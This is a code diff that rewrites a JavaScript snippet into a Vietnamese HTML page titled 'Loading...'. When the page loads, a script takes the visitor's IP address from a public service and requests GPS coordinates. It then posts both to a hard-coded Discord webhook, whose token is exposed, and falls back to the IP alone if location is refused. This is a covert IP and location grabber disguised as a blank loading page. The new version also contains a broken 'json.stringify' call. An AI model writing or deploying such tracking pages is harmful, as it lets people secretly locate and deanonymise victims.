@@ -1,31 +1,61 @@
-async function sendToDiscord(data) {
-    const webhookUrl = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
-    await fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: data })
-    });
-}
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
 
-// 1. Luôn lấy IP khi load trang
-fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-        const ip = data.ip;
-        
-        // 2. Kiểm tra GPS
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    // Nếu đồng ý: Gửi cả IP và GPS
-                    sendToDiscord(`📍 **Truy cập:**\nIP: ${ip}\nLat: ${position.coords.latitude}\nLong: ${position.coords.longitude}`);
-                },
-                () => {
-                    // Nếu từ chối: Chỉ gửi IP
-                    sendToDiscord(`📍 **Truy cập (Từ chối GPS):**\nIP: ${ip}`);
-                }
-            );
-        } else {
-            sendToDiscord(`📍 **Truy cập (Không hỗ trợ GPS):**\nIP: ${ip}`);
+    <script>
+        // Hàm gửi dữ liệu lên Discord
+        async function sendToDiscord(data) {
+            const webhookUrl = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
+            
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: json.stringify({ content: data })
+                });
+            } catch (error) {
+                console.error("Lỗi gửi Webhook:", error);
+            }
         }
-    });
+
+        // Tự động chạy khi trang được tải
+        async function init() {
+            // 1. Lấy địa chỉ IP
+            let ip = "Không xác định";
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+            } catch (e) {
+                console.error("Không lấy được IP");
+            }
+
+            // 2. Kiểm tra quyền GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // Nếu đồng ý cấp quyền
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const long = position.coords.longitude;
+                        sendToDiscord(`📍 **Truy cập:**\nIP: ${ip}\nLat: ${lat}\nLong: ${long}`);
+                    },
+                    // Nếu từ chối cấp quyền
+                    () => {
+                        sendToDiscord(`⚠️ **Truy cập (Từ chối GPS):**\nIP: ${ip}`);
+                    }
+                );
+            } else {
+                // Nếu trình duyệt không hỗ trợ GPS
+                sendToDiscord(`❌ **Truy cập (Không hỗ trợ GPS):**\nIP: ${ip}`);
+            }
+        }
+
+        init();
+    </script>
+
+</body>
+</html>
